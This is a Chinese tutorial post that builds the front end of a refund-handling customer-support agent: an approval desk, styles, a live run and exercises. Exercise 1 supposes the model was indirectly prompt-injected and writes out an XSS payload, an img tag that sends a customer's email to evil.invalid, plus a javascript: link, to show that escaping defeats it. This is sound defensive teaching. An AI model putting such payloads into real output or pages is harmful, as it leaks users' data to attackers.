      {items?.length === 0 && <p className="muted">没有待审批的退款。去客户视角提交一张退款工单试试。</p>}
      {/* 审批完不立刻从列表里移除:客服要看到恢复后的流程跑完,下次刷新再消失 */}
      {items?.map((r) => <ApprovalCard key={r.id} r={r} />)}
    </div>
  );
}
```

<div class="line-notes">

- `const FINANCE_REVIEW_LINE = 1000;` 只用来显示提示。前端和后端各存一份阈值,迟早会对不上,练习 2 把它挪回后端。
- `function ApprovalCard({ r }: { r: PendingRefund }) {` 每张卡片一个组件。
- `const { state, start } = useRun();` 每张卡片一个独立的 useRun,批这一笔不会影响别的卡片。
- `const decided = state.status !== "idle";` 点过通过或驳回,按钮就收起来,防止重复提交。后端也有防护:再审批一次是 409(Day 467),前端收起按钮是让人根本碰不到。
- `start((signal) => decide(r.ticket_id, { approved, approver: "demo-finance", note }, signal));` 审批也是 POST + SSE。approver 写死成 demo-finance,真系统里来自登录信息(Day 413 讲凭证)。后端会把它写进审计日志。
- `<h2 id={`h-${r.id}`}>{r.id} · {r.customer_name} · ¥{r.amount_cny}</h2>` 实测卡片标题是「RF-T000153-INV-202609-0002 · 李娜 · ¥950」。
- `<p className="muted">工单 {r.ticket_id} · 规则 <code>{r.rule}</code> · 原因:{r.reason}</p>` 实测原因是「年付首购第 7 天(14 天窗口内),客户表示专业版用不上,要求全额退款 950 元」。这句话是模型调 create_refund_request 时自己写的,每次措辞都不一样。
- `placeholder="驳回时建议写原因,会发给客户"` approval 节点会把备注拼进给客户的「补充」里(Day 460)。告诉客服这句话客户看得到。
- `<RunView state={state} id={`run-${r.id}`} />` 点了以后,恢复的流程就在卡片里跑完。不传 onStop:审批的流只有两个不调模型的节点,一闪就完,停止没有意义。
- `const [items, setItems] = useState<PendingRefund[] | null>(null);` null 是还没加载完,`[]` 是加载完了但没有,两种情况界面不一样。
- `listApprovals().then(setItems, () => setError(` 成功直接把数组交给 setItems,失败显示提示。
- `useEffect(load, [load]);` load 用 useCallback 包过、依赖是空数组,引用不变,所以这个 effect 只在挂载时跑一次。开发模式下 React 的严格模式会故意跑两次,`/approvals` 是只读的,跑两次没关系。
- `{/* 审批完不立刻从列表里移除` 一点就消失的话,客服没法确认自己刚才批的是哪一笔、结果是什么。

</div>

审批交互在客服这边是:卡片上有申请号、客户、金额、规则、模型写的原因,超过复核线的标红;一个备注框、通过和驳回两个按钮;点了以后按钮收起,恢复后的流程在卡片里跑完,显示定稿的回复和最终花费。

有一样东西客服现在看不到:**要发给客户的草稿**。interrupt 事件里带着 draft,可那是客户页面那条流收到的;工作台的数据来自 `/approvals`,它只查了 `biz.refund_requests` 表。客服批的是钱,但批完以后客户收到的是那段草稿加一句「补充」,草稿里写错了什么,客服在批之前没机会看到。这件事属于「谁该看到什么」,[Day 472](/blog/agent-zero/day-472-ui-audience/) 讲三种用户三种信息密度时会把它补上。

## 第五步:样式

样式没引 UI 库,四十来行 CSS,跟随系统切换明暗。和 Agent 有关的只有几处:提交申请卡片的底色(`.tool-propose`)、打字机光标(`.typing::after`)、减少动态效果时关掉光标闪烁。其余照抄就行,你平时用 Tailwind 或 shadcn/ui 换上去也就半小时。

```css
/* supportpilot/web/src/app/globals.css  够用就行,不引 UI 库 */
:root { --ink:#1e2329; --soft:#474d57; --faint:#707a8a; --rule:#e6e8ea; --bg:#fafafa; --card:#fff;
  --accent:#9a6c00; --accent-bg:#fdf3d1; --ok:#03875a; --danger:#c62828; color-scheme: light dark; }
@media (prefers-color-scheme: dark) { :root { --ink:#eaecef; --soft:#b7bdc6; --faint:#848e9c; --rule:#2b3139;
  --bg:#0b0e11; --card:#181a20; --accent:#f0b90b; --accent-bg:#2b2410; --ok:#0ecb81; --danger:#f6465d; } }
* { box-sizing: border-box; }
body { margin: 0; font: 16px/1.7 system-ui, "PingFang SC", sans-serif; color: var(--ink); background: var(--bg); }
.topnav { display: flex; gap: 1.2rem; align-items: center; padding: .8rem 1.5rem; border-bottom: 1px solid var(--rule); }
.topnav a { color: var(--soft); }
.page { max-width: 52rem; margin: 0 auto; padding: 1.5rem; }
label { display: grid; gap: .3rem; font-size: .9rem; color: var(--soft); }
input, select, textarea, button { font: inherit; }
input, select, textarea { padding: .5rem .6rem; border: 1px solid var(--rule); border-radius: 6px; background: var(--card); color: var(--ink); }
button { padding: .5rem 1rem; border-radius: 6px; border: 1px solid var(--accent); background: var(--accent); color: var(--bg); cursor: pointer; }
button:disabled { opacity: .45; cursor: not-allowed; }
:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
.btn-ghost, .link { background: transparent; color: var(--accent); }
.link { border: 0; padding: 0; text-decoration: underline; }
.btn-danger { background: transparent; color: var(--danger); border-color: var(--danger); }
.ticket-form, .decide { display: grid; gap: .8rem; }
.decide { grid-template-columns: 1fr auto auto; align-items: end; }
.ask { display: flex; gap: .5rem; margin-top: 1rem; } .ask input { flex: 1; }
.muted { color: var(--faint); font-size: .9rem; } .error { color: var(--danger); } .warn { color: var(--danger); font-weight: 600; }
.card, .run { background: var(--card); border: 1px solid var(--rule); border-radius: 10px; padding: 1rem 1.2rem; margin: 1rem 0; }
.run-head { display: flex; justify-content: space-between; align-items: center; }
.badge { margin: 0; font-size: .95rem; } .badge-waiting_approval { color: var(--accent); } .badge-error { color: var(--danger); }
.steps { list-style: none; padding: 0; margin: .6rem 0; display: flex; flex-wrap: wrap; gap: .3rem .9rem; font-size: .9rem; }
.tick { color: var(--ok); margin-right: .2rem; } .step-detail, .pending { color: var(--faint); }
.tools { list-style: none; padding: 0; display: grid; gap: .5rem; }
.tool { border: 1px solid var(--rule); border-left: 3px solid var(--ok); border-radius: 6px; padding: .4rem .7rem; font-size: .88rem; }
.tool-propose { border-left-color: var(--accent); background: var(--accent-bg); } .tool-error { border-left-color: var(--danger); }
.tool-head { display: flex; justify-content: space-between; } .tool-tag { color: var(--faint); font-size: .8rem; }
.tool pre { margin: .3rem 0 0; font-size: .8rem; overflow-x: auto; } .tool-err { color: var(--danger); margin: .3rem 0 0; }
.note { font-size: .9rem; color: var(--soft); } .note-approval { color: var(--accent); }
.reply-body { white-space: pre-wrap; } .sources { font-size: .88rem; color: var(--soft); }
.typing::after { content: "▌"; animation: blink 1s steps(2) infinite; }
@keyframes blink { 50% { opacity: 0; } }
@media (prefers-reduced-motion: reduce) { .typing::after { animation: none; } }
.bubble { margin-left: auto; max-width: 80%; background: var(--accent-bg); padding: .5rem .8rem; border-radius: 10px; width: fit-content; }
.sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip-path: inset(50%); }
pre { white-space: pre-wrap; }
@media (max-width: 560px) { .decide { grid-template-columns: 1fr; } }
```

<div class="line-notes">

- `:root { --ink:#1e2329;` 颜色都用 CSS 变量,下面暗色模式只改变量。
- `.tool-propose { border-left-color: var(--accent); background: var(--accent-bg); }` 提交申请的卡片换成琥珀色左边框和浅底,查询是绿色左边框、白底,出错是红色左边框。
- `.reply-body { white-space: pre-wrap; }` 保留回复里的换行。模型和后端都用 `\n\n` 分段,不加这一行所有段落挤成一行。
- `.typing::after { content: "▌"; animation: blink 1s steps(2) infinite; }` 打字机末尾的光标,用伪元素画,不占正文。
- `@media (prefers-reduced-motion: reduce) { .typing::after { animation: none; } }` 系统设置里开了「减少动态效果」的用户,光标不闪。
- `.sr-only { position: absolute;` 视觉上隐藏、读屏软件还能读到。用 `display: none` 的话读屏也读不到了。

</div>

## 第六步:真模型走一遍

先重新造数、清快照(Day 464 讲过工单号会重用的坑),起后端和前端。在 supportpilot 根目录:

```bash
uv run python -m supportpilot.memory.checkpoint
uv run python scripts/seed_db.py
SUPPORTPILOT_WEB_ORIGINS=http://localhost:3469 uv run uvicorn supportpilot.api.app:app --port 8469
```

另一个终端,在 `web/` 目录:

```bash
npx tsc --noEmit -p .
NEXT_PUBLIC_SUPPORTPILOT_API=http://localhost:8469 npx next dev -p 3469
```

我实跑用 8469 和 3469 两个端口,你用默认的 8000 和 3000 时,两个环境变量都可以不设。打开 `http://localhost:3469`,表单里的默认值就是李娜那张退款单,直接点「提交工单」。

下面的数字和文字,是我用无头浏览器读页面得到的真实值(这一节只是为了把时间点记准,你直接用浏览器看就行,Day 472 会正式写 Playwright 测试)。

**客户视角,提交之后。** 0.23 秒状态行出现「处理中」。9.1 秒开始出字,这时步骤列表是「✓查客户档案 · 找到客户 · 有画像 ✓整理上下文 ✓分诊 · 分类:refund ✓检索帮助中心 · 命中 3 篇:KB-refund-001、KB-refund-003、KB-plans-002 ✓查业务数据 ✓起草回复 …」。10.4 秒停在审批,状态行变成「已提交审批,等客服处理 · 花费 ¥0.0258」,步骤最后多了「✓质检」。工具卡片四张,标签依次是查询、查询、查询、提交申请 · 要人审批,前三张 class 是 `tool`,最后一张是 `tool tool-propose`。卡片下面是「退款申请 RF-T000153-INV-202609-0002(¥950)已提交审批」,950 元没过复核线,后半句不显示。正文是:

```text
草稿,审批后定稿:您好，您的专业版年付订单在首次购买后 14 天内，符合无理由全额退款条件 [KB-refund-001]。我们已为您提交退款申请（单号 RF-T000153-INV-202609-0002，金额 950 元），审核通过后会原路退回。审核进度会另行通知，请您留意。
```

草稿里的引用还是 `[KB-refund-001]` 这种文章编号,定稿时才换成 `[1]`。输入框是禁用的,`aria-busy` 是 false。

「开始出字」要等 9 秒,前面 9 秒用户看到的是一个个打勾的步骤和四张工具卡片。如果只做了打字机效果、不显示过程,这 9 秒就是一片空白。

**客服工作台。** 新开一个标签页打开 `/desk`,一张卡片:「RF-T000153-INV-202609-0002 · 李娜 · ¥950」,下面一行「工单 T000153 · 规则 annual_first_14_days · 原因:年付首购第 7 天(14 天窗口内),客户表示专业版用不上,要求全额退款 950 元」。备注填「首购 7 天内,符合规则」,点「通过」:0.17 秒后卡片里出现「已完成 · 花费 ¥0.0258」和「✓审批 ✓定稿」,approval 和 finalize 都不调模型,花费和审批前一样。下面是定稿的回复:正文里一个上标 [1],链接到 `#run-RF-T000153-INV-202609-0002-ref-1`;正文末尾是「补充:您的退款申请已审核通过,950.00 元将原路退回,到账时间以支付渠道为准。」;参考文章一条,「退款政策总览」,新标签页打开 `https://help.cloudledger.example/help/refund/001`。

**回到客户视角。** 点「刷新进展」,状态行变成「已完成 · 花费 ¥0.0258」,输入框恢复可用。追问「好的,大概几天能到账?」,7.9 秒后完成,状态行「已完成 · 花费 ¥0.04739」。页面上现在有两个 RunView 和一个气泡:第一轮(已存进历史)、客户的气泡、第二轮。第二轮的回复是:

```text
您好，您的退款申请已审核通过，950.00 元将原路退回，到账时间以支付渠道为准。具体时效：微信支付、支付宝 1–3 个工作日，银行卡 3–7 个工作日，对公转账 5–10 个工作日 [1]。另外提醒您，该订阅目前仍为生效状态且已开启自动续费，如后续不再使用，建议关闭自动续费以免下个周期扣款；如需协助可随时联系我们。
```

它接上了「已审核通过」(Day 464 的对话记忆),又一次提醒了关自动续费,和 Day 467 那次一样,这句话该不该说留给 Day 476 的评测。

**再看工作台。** 点「刷新」,显示「没有待审批的退款。去客户视角提交一张退款工单试试。」

这一趟真模型花费就是最后那个 0.04739 元:第一轮 0.0258,追问 0.02159,审批 0。

<figure class="video">
<div class="video-frame"><iframe src="https://player.bilibili.com/player.html?bvid=BV14Y5C66EwY&autoplay=0&high_quality=1" title="流式渲染深度实战：从 ReadableStream 到生成式 UI" loading="lazy" scrolling="no" allowfullscreen></iframe></div>
<figcaption>blackstone_99 · 流式渲染深度实战:从 ReadableStream 到生成式 UI · 12 分钟,2026 年。从读流讲到把模型输出渲染成组件,前半段复习 Day 469,后半段看「生成式 UI」是怎么把工具调用画成卡片的,和我们手写的 ToolCard 对照。</figcaption>
</figure>

## 零件和大代码的对照

| 零件 | 文件 | 作用 |
| --- | --- | --- |
| `RunView`、`headline` | `src/components/RunView.tsx` | 一次运行的五块:状态、过程、工具、审批、正文 |
| `ToolCard`、`PROPOSE`、`pretty` | `src/components/ToolCard.tsx` | 查询和提交申请分开显示,参数折叠 |
| `parseReply`、`splitCitations` | `src/lib/reply.ts` | 后端拼好的回复拆成正文和参考文章 |
| `Reply` | `src/components/Reply.tsx` | `[1]` 渲染成上标链接,正文当纯文本 |
| 顶部导航 | `src/app/layout.tsx` | 客户视角、客服工作台、调试页 |
| `CustomerPage` | `src/app/page.tsx` | 提交、看过程、停在审批时锁输入、刷新进展、追问 |
| `DeskPage`、`ApprovalCard` | `src/app/desk/page.tsx` | 待审批列表,每张卡片一个 useRun |
| 样式 | `src/app/globals.css` | 四十来行,跟随明暗 |

## 动手练习

### 练习 1:被注入的回复,渲染出来是什么

假设模型被间接注入,回复正文里夹了一个 `<img src="https://evil.invalid/?q=lina@example.com">`,参考文章里还混进一行 `[2] 点我领红包 javascript:alert(1)`。不起服务,用 `react-dom/server` 的 `renderToStaticMarkup` 把 `Reply` 渲染成 HTML 字符串,看里面有没有真的 `<img` 标签和 `javascript:` 链接。再写一个用 `dangerouslySetInnerHTML` 的反面版本对比。

<details><summary>参考答案</summary>

```ts
// supportpilot/web/scripts/xss_check.mts
// 练习 1:假设模型被注入,回复里夹了一个 <img>。看 Reply 组件渲染出来的 HTML 里它是什么样子。不起服务。
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Reply } from "../src/components/Reply.tsx";

const evil = '您好 [1]<img src="https://evil.invalid/?q=lina@example.com">\n\n参考文章:\n'
  + "[1] 退款政策总览 https://help.cloudledger.example/help/refund/001\n"
  + "[2] 点我领红包 javascript:alert(1)";
const html = renderToStaticMarkup(createElement(Reply, { text: evil, id: "x" }));
console.log(html);
console.log("真的 <img 标签:", html.includes("<img"), " javascript: 链接:", html.includes('href="javascript'));
```

<div class="line-notes">

- `import { renderToStaticMarkup } from "react-dom/server";` 把组件渲染成一段 HTML 字符串,不需要浏览器。Next.js 服务端渲染用的就是这一类函数。
- `import { Reply } from "../src/components/Reply.tsx";` tsx 能直接跑 .tsx 文件,JSX 按 tsconfig 的 `"jsx": "react-jsx"` 转换。
- `const evil = '您好 [1]<img src="https://evil.invalid/?q=lina@example.com">\n\n参考文章:\n'` 手写一段被注入的回复。真实场景里它来自模型,模型的输入里有攻击者写的文字。
- `+ "[2] 点我领红包 javascript:alert(1)";` 一个伪装成参考文章的 javascript 链接。
- `const html = renderToStaticMarkup(createElement(Reply, { text: evil, id: "x" }));` scripts 是 .mts 文件,不能写 JSX,所以用 `createElement`,它就是 JSX 编译出来的东西。

</div>

```bash
npx tsx scripts/xss_check.mts
```

真实输出:

```text
<div class="reply"><p class="reply-body"><span>您好 </span><sup><a href="#x-ref-1" aria-label="参考文章 1">[1]</a></sup><span>&lt;img src=&quot;https://evil.invalid/?q=lina@example.com&quot;&gt;

</span><sup><a href="#x-ref-2" aria-label="参考文章 2">[2]</a></sup><span> 点我领红包 javascript:alert(1)</span></p><ol class="sources" aria-label="参考文章"><li id="x-ref-1" value="1"><a href="https://help.cloudledger.example/help/refund/001" target="_blank" rel="noopener noreferrer">退款政策总览</a></li></ol></div>
真的 <img 标签: false  javascript: 链接: false
```

`<img` 变成了 `&lt;img`,浏览器显示成字符,不会去请求那个地址。javascript 那一行不符合 `LINE` 正则(只认 http 和 https),被当成「补充」挪回了正文,也是纯文本。有一个小瑕疵:它前面的 `[2]` 被渲染成了上标,链接指向一个不存在的 `#x-ref-2`,点了没反应,不危险。想更严,可以只把在 sources 里出现过的编号渲染成上标。

反面版本:

```ts
// supportpilot/web/scripts/xss_bad.mts
// 练习 1 的反面:图省事用 dangerouslySetInnerHTML 显示回复。不起服务。
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

const evil = '您好<img src="https://evil.invalid/?q=lina@example.com">';
const BadReply = ({ text }: { text: string }) =>
  createElement("p", { className: "reply-body", dangerouslySetInnerHTML: { __html: text } });
const html = renderToStaticMarkup(createElement(BadReply, { text: evil }));
console.log(html);
console.log("真的 <img 标签:", html.includes("<img"));
```

<div class="line-notes">

- `createElement("p", { className: "reply-body", dangerouslySetInnerHTML: { __html: text } });` React 故意把这个属性名起得又长又吓人,还要多套一层 `__html`,就是想让你写的时候犹豫一下。

</div>

```bash
npx tsx scripts/xss_bad.mts
```

真实输出:

```text
<p class="reply-body">您好<img src="https://evil.invalid/?q=lina@example.com"></p>
真的 <img 标签: true
```

这个 `<img>` 一到浏览器,不用任何人点击,就会请求 `evil.invalid`,把查询参数里的邮箱发过去。

</details>

### 练习 2:复核线只存一份

工作台里写死了 `FINANCE_REVIEW_LINE = 1000`,后端 `settings.refund_review_threshold` 也是 1000,两份迟早对不上。改后端的 `/approvals`,每条多返回一个 `needs_finance_review`;写一个连库测试,往 `biz.refund_requests` 里插两条 950 元和 7080 元的待审批申请,断言这个字段;再改前端,删掉那个常量。

<details><summary>参考答案</summary>

后端 `api/app.py` 的 `list_approvals` 最后一行改成:

```python
# supportpilot/src/supportpilot/api/app.py(list_approvals 的 return 改成三行)
    line = R["deps"].settings.refund_review_threshold   # Day 470 练习 2:复核线只在后端存一份
    return [biz._jsonable(r) | {"created_at": str(r["created_at"]), "needs_finance_review": float(r["amount_cny"]) > line}
            for r in rows]
```

<div class="line-notes">

- `line = R["deps"].settings.refund_review_threshold` 从资源袋里的 deps 取配置。测试里塞的是假 deps,它的 settings 也是 `Settings()`,读同一份默认值。
- `"needs_finance_review": float(r["amount_cny"]) > line}` 数据库里 amount_cny 是 `numeric(10,2)`,psycopg 读出来是 Python 的 Decimal;转成 float 再和 1000.0 比较。和 approval 节点里 interrupt 带的 needs_finance_review 是同一个判断。

</div>

```python
# supportpilot/tests/test_approvals_list.py
"""Day 470 练习 2:/approvals 带上 needs_finance_review,前端不再自己存一份复核线。不调模型。"""

import pytest
from test_api import client  # noqa: F401

ROWS = [("RF-TEST-950", "INV-202609-0002", "C0002", 950), ("RF-TEST-7080", "INV-202609-0008", "C0008", 7080)]


@pytest.mark.db
def test_approvals_carry_finance_flag(client):
    from supportpilot.api import app as api
    conn = api.R["conn"]
    for rid, inv, cid, amt in ROWS:
        conn.execute("INSERT INTO biz.refund_requests (id, invoice_id, customer_id, amount_cny, reason, rule) "
                     "VALUES (%s, %s, %s, %s, 'api-test', 'test')", (rid, inv, cid, amt))
    try:
        got = {r["id"]: r["needs_finance_review"] for r in client.get("/approvals").json() if r["reason"] == "api-test"}
        assert got == {"RF-TEST-950": False, "RF-TEST-7080": True}
    finally:
        conn.execute("DELETE FROM biz.refund_requests WHERE reason = 'api-test'")
```

<div class="line-notes">

- `ROWS = [("RF-TEST-950", "INV-202609-0002", "C0002", 950), ("RF-TEST-7080", "INV-202609-0008", "C0008", 7080)]` 种子数据里真实存在的两张发票:李娜的 950 元专业版年付、黄强(C0008)的 7080 元。外键要求发票和客户都存在。
- `from supportpilot.api import app as api` 写在函数里也行,client fixture 已经把 `api.R` 里的连接准备好了。
- `conn.execute("INSERT INTO biz.refund_requests (id,` 直接插行,不经过模型。reason 写成 api-test,收尾时按它删。
- `got = {r["id"]: r["needs_finance_review"] for r in client.get("/approvals").json() if r["reason"] == "api-test"}` 只看自己插的两条,开发库里可能还有别的待审批申请。
- `finally:` 断言失败也要删掉插的行。Day 467 吃过「测试弄脏开发库」的亏。

</div>

```bash
uv run pytest tests/test_approvals_list.py -q
```

改后端之前跑是 `KeyError: 'needs_finance_review'`,改完 `1 passed`。全部测试 `62 passed`(Day 468 的 61 个加这一个)。注意:后端没开 `--reload` 的话,改完要重启 uvicorn。

还有一个我实际踩到的坑:在浏览器里真走了一遍退款审批以后,再跑全部测试,`test_tools.py` 有两个失败,报 `账单状态是 refunded,只有已支付的账单可以退款`。不是代码坏了,是李娜那张发票在开发库里真被退了,Day 452 的测试假设它还是 paid。重新 `seed_db.py` 就好。还是 Day 467 那句话:测试最好有自己的库。

前端两处。`api.ts` 的 `PendingRefund` 加一个字段:

```ts
// supportpilot/web/src/lib/api.ts(PendingRefund 改成)
export type PendingRefund = RefundRequest & {
  ticket_id: string;
  customer_name: string;
  created_at: string;
  needs_finance_review: boolean; // Day 470 练习 2:后端按复核线算好
};
```

<div class="line-notes">

- `needs_finance_review: boolean; // Day 470 练习 2:后端按复核线算好` 和后端新加的字段一一对应。先改类型,TypeScript 会把用到它的地方都检查一遍。

</div>

`desk/page.tsx` 删掉 `FINANCE_REVIEW_LINE` 那一行常量,标红那一行改成:

```tsx
      {r.needs_finance_review && <p className="warn">金额超过复核线,按政策需要财务复核</p>}
```

<div class="line-notes">

- `{r.needs_finance_review && <p className="warn">` 前端不再知道复核线是多少,只显示后端的结论。财务改了阈值,只改后端配置。

</div>

`npx tsc --noEmit -p .` 0 报错。我往库里临时插了一条黄强 7080 元的申请,工作台卡片显示「RF-DEMO-7080 · 黄强 · ¥7080」,下面一行红字「金额超过复核线,按政策需要财务复核」,看完把这条删掉了。

</details>

### 练习 3:三种工具卡片

不起服务,把三张工具卡片渲染成 HTML 看:一张查询(list_invoices)、一张提交申请(create_refund_request)、一张参数是坏 JSON 而且出错了的(check_refund_eligibility,args 是 `{"invoice_id": "INV-2026`)。确认 class、标签和参数框里的内容。

<details><summary>参考答案</summary>

```ts
// supportpilot/web/scripts/toolcard_check.mts
// 练习 3:三张工具卡片(查询、提交申请、参数是坏 JSON 且出错)各渲染成什么。不起服务。
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { ToolCard } from "../src/components/ToolCard.tsx";
import type { ToolEvent } from "../src/lib/events.ts";

const tools: ToolEvent[] = [
  { type: "tool", name: "list_invoices", args: '{"customer_id": "C0002", "limit": 10}', error: false },
  { type: "tool", name: "create_refund_request", args: '{"invoice_id": "INV-202609-0002"}', error: false },
  { type: "tool", name: "check_refund_eligibility", args: '{"invoice_id": "INV-2026', error: true },
];
for (const t of tools) console.log(renderToStaticMarkup(createElement(ToolCard, { tool: t })), "\n");
```

<div class="line-notes">

- `const tools: ToolEvent[] = [` 前两张的 args 和真后端推的一模一样;第三张是故意截断的 JSON,模拟模型输出被截断或者写错。
- `for (const t of tools) console.log(renderToStaticMarkup(createElement(ToolCard, { tool: t })), "\n");` 每张单独渲染。ToolCard 是 `<li>`,单独渲染没有外面的 `<ul>`,看结构够了。

</div>

```bash
npx tsx scripts/toolcard_check.mts
```

真实输出:

```text
<li class="tool"><div class="tool-head"><code>list_invoices</code><span class="tool-tag">查询</span></div><details><summary>参数</summary><pre>{
  &quot;customer_id&quot;: &quot;C0002&quot;,
  &quot;limit&quot;: 10
}</pre></details></li> 

<li class="tool tool-propose"><div class="tool-head"><code>create_refund_request</code><span class="tool-tag">提交申请 · 要人审批</span></div><details><summary>参数</summary><pre>{
  &quot;invoice_id&quot;: &quot;INV-202609-0002&quot;
}</pre></details></li> 

<li class="tool tool-error"><div class="tool-head"><code>check_refund_eligibility</code><span class="tool-tag">出错</span></div><details><summary>参数</summary><pre>{&quot;invoice_id&quot;: &quot;INV-2026</pre></details><p class="tool-err">工具返回了错误,Agent 会看到错误信息再决定下一步</p></li> 
```

前两张参数被排成了多行,第三张解析失败,原样显示成一行,卡片没崩,下面多了一句出错说明。`&quot;` 是引号的转义,浏览器里显示的就是 `"`。

</details>

### 练习 4:三种回复拆出来是什么样

用 `parseReply` 和 `splitCitations` 拆三段回复:转人工那句固定回复、今天审批后的定稿原文、一段有两个引用的回复。打印正文结尾和 sources,看「补充」被放到了哪里。

<details><summary>参考答案</summary>

```ts
// supportpilot/web/scripts/reply_check.mts
// 练习 4:三种回复拆出来是什么样。前两条是今天真后端返回的原文,第三条是手写的两个引用的例子。不起服务。
import { parseReply, splitCitations } from "../src/lib/reply.ts";

const replies = {
  handoff: "您好,您的问题已经转给人工客服同事,会在 1 个工作日内通过这个工单回复您。",
  approved: "您好，您的专业版年付订单在首次购买后 14 天内，符合无理由全额退款条件 [1]。"
    + "我们已为您提交退款申请（单号 RF-T000153-INV-202609-0002，金额 950 元），审核通过后会原路退回。审核进度会另行通知，请您留意。\n\n参考文章:\n"
    + "[1] 退款政策总览 https://help.cloudledger.example/help/refund/001\n\n"
    + "补充:您的退款申请已审核通过,950.00 元将原路退回,到账时间以支付渠道为准。",
  twoRefs: "银行卡 3–7 个工作日 [1],年付超过 14 天按月折算 [2]。\n\n参考文章:\n"
    + "[1] 退款多久到账 https://help.cloudledger.example/help/refund/005\n"
    + "[2] 年付超过 14 天怎么退 https://help.cloudledger.example/help/refund/003",
};
for (const [k, r] of Object.entries(replies)) {
  const p = parseReply(r);
  console.log(k, JSON.stringify({ body: p.body.slice(-30), sources: p.sources.map((s) => `${s.n}:${s.title}`) }));
  console.log("   切开:", JSON.stringify(splitCitations(p.body)).slice(0, 110));
}
```

<div class="line-notes">

- `handoff: "您好,您的问题已经转给人工客服同事,` handoff 节点的固定回复,Day 469 的 T000156 就是这句。
- `approved: "您好，您的专业版年付订单在首次购买后 14 天内，` 第六步工作台里那条定稿的原文,包括「补充」。
- `twoRefs: "银行卡 3–7 个工作日 [1],` 手写的,标题和路径用的是知识库里真实存在的两篇。
- `for (const [k, r] of Object.entries(replies)) {` `Object.entries` 拿到键值对数组,相当于 Python 的 `dict.items()`。
- `p.body.slice(-30)` 只看正文最后 30 个字,看「补充」在不在正文末尾。

</div>

```bash
npx tsx scripts/reply_check.mts
```

真实输出:

```text
handoff {"body":"经转给人工客服同事,会在 1 个工作日内通过这个工单回复您。","sources":[]}
   切开: ["您好,您的问题已经转给人工客服同事,会在 1 个工作日内通过这个工单回复您。"]
approved {"body":"核通过,950.00 元将原路退回,到账时间以支付渠道为准。","sources":["1:退款政策总览"]}
   切开: ["您好，您的专业版年付订单在首次购买后 14 天内，符合无理由全额退款条件 ",1,"。我们已为您提交退款申请（单号 RF-T000153-INV-202609-0002，金额 950 元），审核通过后会原路退回。审核
twoRefs {"body":"–7 个工作日 [1],年付超过 14 天按月折算 [2]。","sources":["1:退款多久到账","2:年付超过 14 天怎么退"]}
   切开: ["银行卡 3–7 个工作日 ",1,",年付超过 14 天按月折算 ",2,"。"]
```

转人工的回复没有参考文章,原样返回、一段文字;定稿的「补充」从参考文章后面挪回了正文末尾;两个引用切成五段,奇数位是编号,「年付超过 14 天怎么退」标题里有空格也切对了。

</details>

验收标准:`npx tsc --noEmit -p .` 0 报错;在浏览器里亲手走通「提交退款 → 停在审批 → 工作台通过 → 客户刷新进展 → 追问」,看到工具卡片里只有提交申请那张是琥珀色底、审批卡片里的回复有上标 [1] 和参考文章链接;`xss_check.mts` 打印两个 false;`uv run pytest -q` 是 62 个通过;今天真模型花费在 0.1 元以内(我是 0.047 元)。

## 名词解释

| 名词 | 意思 |
| --- | --- |
| RunView | 今天写的组件,把一次运行的 `RunState` 画成五块:状态、过程、工具、审批、正文。 |
| 工具调用卡片 | 把 Agent 每次调用工具画成一张卡片,显示工具名、类型和折叠起来的参数。 |
| PROPOSE 级工具 | Day 453 的权限分级之一:会留下一条要人审批的记录,但不直接产生不可逆的后果。例:create_refund_request。 |
| 人在回路(human-in-the-loop) | Agent 做到一半停下来,等人做决定再继续。例:退款停在审批节点,客服点通过才执行。 |
| 草稿 / 定稿 | 草稿是打字机里模型逐字推的原文,引用是文章编号;定稿是后端拼好引用链接、加上「补充」的最终回复。 |
| 上标引用 | 正文里的 `[1]` 渲染成 `<sup>` 里的链接,点了跳到文末对应的参考文章。 |
| XSS(跨站脚本) | 攻击者让网页渲染出他写的 HTML 或脚本。例:模型回复里的 `<img src="攻击者网站">` 被当成 HTML 渲染。 |
| dangerouslySetInnerHTML | React 里把一段字符串当 HTML 插进页面的属性,会跳过 React 的自动转义。 |
| 自动转义 | React 把文本节点里的 `<`、`"` 等字符换成 `&lt;`、`&quot;`,浏览器显示成字符而不是标签。 |
| rel="noopener noreferrer" | 新标签页打开链接时,不让新页面拿到 `window.opener`,也不发送来源地址。 |
| aria-live | 告诉读屏软件「这块内容变了要念出来」。polite 表示等用户空闲时再念。 |
| renderToStaticMarkup | react-dom/server 的函数,把组件渲染成 HTML 字符串,不需要浏览器。 |
| form action | React 19 的写法,`<form action={函数}>`,提交时 React 把 FormData 交给这个函数。 |

## 常见误区

**只做打字机效果,不显示过程。** 第六步实测,退款工单要 9 秒才开始出字。前 9 秒用户能看到的只有步骤和工具卡片。

**拿 draft 当最终回复。** draft 里的引用还是 `[KB-refund-001]`,也没有「补充」;质检退回过的话,第一版早被清掉了。收到 done 就换成 `summary.reply`。

**转人工也显示「已完成」。** reducer 的 status 都是 done,要看 outcome。不区分的话,客户以为问题已经解决。

**以为前端的工具名单就是权限。** `PROPOSE` 只决定卡片的颜色。模型能调什么,是后端 `openai_tools` 给了什么。

**把写库的工具标成「已退款」这种过重的词。** create_refund_request 只是提交了一条申请,钱没动。标签要说清楚真实后果。

**对 args 再 JSON.stringify 一次。** args 本来就是字符串,再编码一次就是一屏反斜杠。先 parse 再 stringify。

**用 dangerouslySetInnerHTML 或 Markdown 渲染库显示回复。** 练习 1 实测:被注入的 `<img>` 会变成真的标签,不用点击就把数据发出去。模型的输出一律当纯文本,链接只从后端拼好的固定格式里解析。

**链接不加 rel="noopener"。** 新页面能通过 `window.opener` 把我们的页面跳到钓鱼地址。

**把 interrupt 的数据整个显示出来。** request 里有写给模型看的 note,给客户看会很奇怪,有的系统里还可能有内部字段。只取要显示的。

**审批完立刻把卡片从列表里删掉。** 客服看不到恢复后的流程跑完没有、结果是什么。下次刷新再消失。

**前后端各存一份阈值。** 练习 2 把复核线挪回后端,前端只显示结论。

**在浏览器里点完一遍,开发库就脏了。** 实测李娜的发票真被退了,`test_tools.py` 两个测试失败。跑测试前重新造数,或者测试用单独的库。

## 学习资料

### 文档与文章

- [OWASP · LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/):OWASP 大模型应用十大风险里专讲「模型输出没处理就交给下游」的一条,XSS 是它列的第一个例子。英文,15 分钟。
